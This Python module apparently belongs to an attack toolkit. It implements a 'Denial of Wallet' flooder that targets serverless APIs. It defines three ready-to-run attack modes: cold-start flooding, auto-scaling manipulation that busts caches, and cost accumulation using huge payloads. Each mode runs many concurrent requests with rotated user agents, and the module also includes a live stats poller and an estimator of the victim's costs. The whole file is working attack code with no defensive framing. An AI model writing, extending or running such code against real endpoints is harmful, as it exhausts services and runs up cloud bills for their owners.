import asyncio
import hashlib
import json
import logging
import random
import time
import uuid
from typing import Dict, Optional
from urllib.parse import urlparse

log = logging.getLogger("mpc_layer.dow")

COLD_START_TRIGGERS = [
    "/api/functions/execute",
    "/api/v1/invoke",
    "/api/v1/functions",
    "/api/v1/runtimes",
    "/api/v1/triggers",
    "/.netlify/functions",
    "/api/functions",
    "/api/v1/webhooks",
    "/api/v1/jobs",
    "/api/v1/tasks",
    "/api/compute",
    "/api/run",
    "/api/v1/actions",
    "/api/v1/workflows",
]

SERVERLESS_PATHS = [
    "/api/v1/users", "/api/v1/orders", "/api/v1/checkout",
    "/api/v1/transform", "/api/v1/process", "/api/v1/analyze",
    "/api/v1/render", "/api/v1/optimize", "/api/v1/convert",
    "/api/v1/validate", "/api/v1/compile", "/api/v1/translate",
    "/api/v1/generate", "/api/v1/classify", "/api/v1/predict",
    "/api/v1/extract", "/api/v1/merge", "/api/v1/resize",
    "/api/v1/compress", "/api/v1/encrypt", "/api/v1/decrypt",
    "/api/v1/notify", "/api/v1/broadcast", "/api/v1/schedule",
]

PAYLOAD_TEMPLATES = [
    lambda: {"data": "x" * random.randint(10000, 100000)},
    lambda: {"query": "a" * random.randint(5000, 50000)},
    lambda: {"input": {"nested": {"deep": {"value": "x" * 50000}}}},
    lambda: {"items": [{"id": i, "value": "x" * 1000} for i in range(100)]},
    lambda: {"image": "data:image/png;base64," + "A" * random.randint(10000, 50000)},
    lambda: {"content": "x" * 100000},
    lambda: {"payload": {"data": {"more": {"deeper": {"value": "x" * 20000}}}}},
]

BILLING_HEADERS = [
    {"X-Cold-Start": "true", "X-Invoke-Type": "sync"},
    {"X-Function-Memory": str(random.choice([128, 256, 512, 1024, 2048, 4096, 8192, 16384]))},
    {"X-Execution-Timeout": str(random.choice([30, 60, 120, 300]))},
    {"X-Concurrency-Key": str(uuid.uuid4())},
]


class ServerlessDoWAttacker:
    def __init__(self, base_url: str, session_pool=None):
        self.base_url = base_url.rstrip("/")
        self.parsed = urlparse(base_url)
        self.host = self.parsed.netloc
        self.session_pool = session_pool
        self._cold_start_count = 0
        self._execution_cost_est = 0
        # Shared metrics dict for real-time polling
        self.metrics = {"completed": 0, "failed": 0, "timeout": 0, "total": 0}
    
    def _reset_metrics(self):
        self.metrics["completed"] = 0
        self.metrics["failed"] = 0
        self.metrics["timeout"] = 0
        self.metrics["total"] = 0
    
    def _final_metrics(self) -> Dict[str, int]:
        return {
            "total_requests": self.metrics["total"],
            "completed": self.metrics["completed"],
            "failed": self.metrics["failed"],
            "timeout": self.metrics["timeout"],
        }

    async def cold_start_trigger(self, duration: int, target_rps: int) -> Dict[str, int]:
        self._reset_metrics()

        async def trigger():
            path = random.choice(COLD_START_TRIGGERS)
            url = f"{self.base_url}{path}"
            unique_id = str(uuid.uuid4())
            payload = {
                "function_id": f"fn-{unique_id[:8]}",
                "payload": random.choice(PAYLOAD_TEMPLATES)(),
                "runtime": random.choice(["nodejs18", "python312", "go121", "java17", "rust"]),
                "memory": random.choice([128, 256, 512, 1024, 2048]),
                "timeout": random.choice([30, 60, 120, 300]),
                "invoke_id": unique_id,
                "cold_start": True,
                "unique_params": {f"p{i}": "x" * 100 for i in range(random.randint(5, 20))},
            }
            headers = {
                "Content-Type": "application/json",
                "X-Invocation-Type": "RequestResponse",
                "X-Function-Name": f"fn-test-{random.randint(1000,9999)}",
                "X-Cold-Start-Bypass": "false",
                "X-Unique-ID": unique_id,
                "User-Agent": random.choice([
                    "Mozilla/5.0 Chrome/136",
                    "Mozilla/5.0 Firefox/140",
                    "axios/1.7.0",
                    "PostmanRuntime/7.36.0",
                    "okhttp/4.12.0",
                    "curl/8.4.0",
                ]),
            }

            self.metrics["total"] += 1
            try:
                import aiohttp
                async with aiohttp.ClientSession() as sess:
                    async with sess.post(url, json=payload, headers=headers, timeout=10) as resp:
                        body = await resp.read()
                        if len(body) > 1000:
                            self._execution_cost_est += len(body) * 2
                        self._cold_start_count += 1
                self.metrics["completed"] += 1
            except asyncio.TimeoutError:
                self.metrics["timeout"] += 1
            except Exception:
                self.metrics["failed"] += 1

        tasks = []
        for _ in range(min(target_rps, 100)):
            tasks.append(asyncio.create_task(self._rate_limited_loop(trigger, duration, target_rps)))
        await asyncio.gather(*tasks, return_exceptions=True)
        return self._final_metrics()

    async def auto_scaling_manipulation(self, duration: int, target_rps: int) -> Dict[str, int]:
        self._reset_metrics()

        async def manipulate():
            path = random.choice(SERVERLESS_PATHS)
            url = f"{self.base_url}{path}"
            cache_buster = hashlib.sha256(str(random.random()).encode()).hexdigest()[:16]
            unique_param = f"?_cb={cache_buster}&uid={uuid.uuid4().hex[:12]}"
            url += unique_param

            body_size = random.choice([1024, 4096, 16384, 65536, 131072])
            payload = {
                "data": "x" * body_size,
                "timestamp": time.time_ns(),
                "nonce": uuid.uuid4().hex,
                "cache_bypass": True,
                "unique_key": cache_buster,
            }
            headers = {
                "Content-Type": "application/json",
                "Cache-Control": "no-cache, no-store, must-revalidate",
                "Pragma": "no-cache",
                "X-Cache-Bypass": cache_buster,
                "User-Agent": random.choice(["Mozilla/5.0 Chrome/136", "axios/1.7.0"]),
            }

            self.metrics["total"] += 1
            try:
                import aiohttp
                async with aiohttp.ClientSession() as sess:
                    async with sess.post(url, json=payload, headers=headers, timeout=15) as resp:
                        await resp.read()
                self.metrics["completed"] += 1
            except asyncio.TimeoutError:
                self.metrics["timeout"] += 1
            except Exception:
                self.metrics["failed"] += 1

        tasks = []
        for _ in range(min(target_rps, 150)):
            tasks.append(asyncio.create_task(self._rate_limited_loop(manipulate, duration, target_rps)))
        await asyncio.gather(*tasks, return_exceptions=True)
        return self._final_metrics()

    async def cost_accumulation(self, duration: int, target_rps: int) -> Dict[str, int]:
        self._reset_metrics()

        async def accumulate():
            path = random.choice(SERVERLESS_PATHS)
            url = f"{self.base_url}{path}"

            large_params = "&" + "&".join(
                f"p{i}={hashlib.md5(str(random.random()).encode()).hexdigest()}"
                for i in range(random.randint(50, 200))
            )
            url += f"?_cost={uuid.uuid4().hex[:8]}"

            expensive_payload = {
                "compute": [random.randint(1000, 10000) for _ in range(100)],
                "sort": [random.random() for _ in range(1000)],
                "hash_rounds": random.randint(10000, 100000),
                "data": "x" * random.randint(50000, 200000),
                "nested_calls": random.randint(5, 20),
                "unique_id": uuid.uuid4().hex,
            }
            headers = {
                "Content-Type": "application/json",
                "X-Execution-Mode": "sync",
                "X-Max-Execution-Time": "300",
            }

            self.metrics["total"] += 1
            try:
                import aiohttp
                async with aiohttp.ClientSession() as sess:
                    async with sess.post(url, json=expensive_payload, headers=headers, timeout=30) as resp:
                        body = await resp.read()
                        self._execution_cost_est += len(body)
                self.metrics["completed"] += 1
            except asyncio.TimeoutError:
                self.metrics["timeout"] += 1
            except Exception:
                self.metrics["failed"] += 1

        tasks = []
        for _ in range(min(target_rps, 80)):
            tasks.append(asyncio.create_task(self._rate_limited_loop(accumulate, duration, target_rps)))
        await asyncio.gather(*tasks, return_exceptions=True)
        return self._final_metrics()

    async def _rate_limited_loop(self, fn, duration: int, target_rps: int):
        start = time.time()
        interval = 1.0 / max(target_rps / 30, 1)
        while time.time() - start < duration:
            await fn()
            await asyncio.sleep(interval)

    def get_cost_estimate(self) -> dict:
        requests = self._cold_start_count
        compute_seconds = requests * 0.5
        gb_seconds = compute_seconds * 0.512
        cost_per_million = 0.20
        estimated_cost = (requests / 1000000) * cost_per_million + (gb_seconds / 400000) * 1.0
        return {
            "cold_starts": self._cold_start_count,
            "estimated_requests": requests,
            "estimated_gb_seconds": round(gb_seconds, 2),
            "estimated_cost_usd": round(estimated_cost, 6),
            "warning": "Costs scale linearly with request volume",
        }


async def _run_dow_with_live_stats(attacker, attacker_method, duration: int, rps: int, live_stats=None) -> dict:
    """Run DoW attack with REAL-TIME polling of attacker.metrics every 0.2s"""
    if live_stats is None:
        return await attacker_method(duration, rps)
    
    live_stats.setdefault("stats", {"total_requests": 0, "completed": 0, "failed": 0, "timeout": 0})
    
    poller_stop = asyncio.Event()
    
    async def poller():
        """Poll attacker.metrics every 0.2s for smooth real-time updates"""
        while not poller_stop.is_set():
            if hasattr(attacker, 'metrics'):
                m = attacker.metrics
                live_stats["stats"] = {
                    "total_requests": m.get("total", 0),
                    "completed": m.get("completed", 0),
                    "failed": m.get("failed", 0),
                    "timeout": m.get("timeout", 0),
                }
            try:
                await asyncio.wait_for(poller_stop.wait(), timeout=0.2)
            except asyncio.TimeoutError:
                continue
    
    poller_task = asyncio.create_task(poller())
    
    try:
        result = await attacker_method(duration, rps)
    finally:
        poller_stop.set()
        try:
            await asyncio.wait_for(poller_task, timeout=1)
        except Exception:
            poller_task.cancel()
    
    if isinstance(result, dict):
        live_stats["stats"] = {
            "total_requests": result.get("total", result.get("total_requests", 0)),
            "completed": result.get("completed", 0),
            "failed": result.get("failed", 0),
            "timeout": result.get("timeout", 0),
        }
    return result


async def run_cold_start_flood(url: str, duration: int, rps: int, live_stats=None, **kwargs) -> dict:
    attacker = ServerlessDoWAttacker(url, kwargs.get("session_pool"))
    return await _run_dow_with_live_stats(
        attacker, lambda d, r: attacker.cold_start_trigger(d, r), duration, rps, live_stats
    )


async def run_auto_scaling_flood(url: str, duration: int, rps: int, live_stats=None, **kwargs) -> dict:
    attacker = ServerlessDoWAttacker(url, kwargs.get("session_pool"))
    return await _run_dow_with_live_stats(
        attacker, lambda d, r: attacker.auto_scaling_manipulation(d, r), duration, rps, live_stats
    )


async def run_cost_accumulation(url: str, duration: int, rps: int, live_stats=None, **kwargs) -> dict:
    attacker = ServerlessDoWAttacker(url, kwargs.get("session_pool"))
    return await _run_dow_with_live_stats(
        attacker, lambda d, r: attacker.cost_accumulation(d, r), duration, rps, live_stats
    )


DOW_ATTACK_METHODS = {
    "cold_start": run_cold_start_flood,
    "auto_scaling": run_auto_scaling_flood,
    "cost_accum": run_cost_accumulation,
}
